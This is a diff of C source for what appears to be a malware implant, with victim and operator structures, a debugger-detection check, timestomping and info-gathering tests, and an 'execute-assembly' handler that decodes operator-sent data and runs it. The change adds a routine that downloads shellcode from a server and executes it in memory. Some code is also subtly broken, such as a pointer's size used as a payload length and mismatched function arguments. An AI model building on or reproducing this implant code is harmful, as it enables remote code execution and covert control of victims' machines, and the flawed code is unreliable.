@@ -4,6 +4,7 @@
 #include <string.h>
 #include <time.h>
 #include <stdlib.h>
+#include <stdlib.h>
 #include <ctype.h>
 #include "Typedefs.h"
 #include "Structs.h"
@@ -11,7 +12,7 @@
 
 void TestingStomp();
 void TestingInfoGatherer();
-void TestingBase64Decode();
+void TestingExecuteAssembly();
 
 BOOL IsDebuggerActive() {
 
@@ -37,7 +38,7 @@ int main() {
         return -1;
     }
 
-    TestingBase64Decode();
+    TestingExecuteAssembly();
 
     // TestingInfoGatherer(victim);
 
@@ -81,7 +82,7 @@ int main() {
                 else if (!strcmp(command.Input, "execute-assembly")) { // Use !strcmp to check for equality
                     const char* encoded_str = command.File;
                     char* decoded_str = from_hex(encoded_str);
-                    ExecuteAssembly(decoded_str, "0");
+                    execute(decoded_str, "0");
 
                     //sendResult(command.ImplantUser, command.Operator);
                 }
@@ -111,28 +112,17 @@ void TestingInfoGatherer(Victim* victim) {
     exit(0);
 }
 
-void TestingBase64Decode() {
-    const char *hex_string = "48656c6c6f"; // "Hello" in hexadecimal
-    size_t out_len = 0;
-    byte *decoded_data = from_hex(hex_string, &out_len);
+void TestingExecuteAssembly() {
+    BYTE* payload = 0;
+    int payloadLength = sizeof(payload);
 
-    if (decoded_data) {
-        printf("Decoded ASCII values: ");
-        for (size_t i = 0; i < out_len; ++i) {
-            printf("%d ", decoded_data[i]);
-        }
-        printf("\n");
-
-        printf("Decoded text: ");
-        for (size_t i = 0; i < out_len; ++i) {
-            printf("%c", decoded_data[i]);
-        }
-        printf("\n");
-
-        free(decoded_data);
-    } else {
-        printf("Invalid hex encoding.\n");
+    int result = fetchCode(L"localhost", L"/TestAssembly.bin", 8000, &payload, &payloadLength);
+    if (result != 0) {
+        printf("[-] Failed to fetch shellcode with error code %d\n", result);
+        return;
     }
+
+    execute(payload, payloadLength);
 
     exit(0);
 }
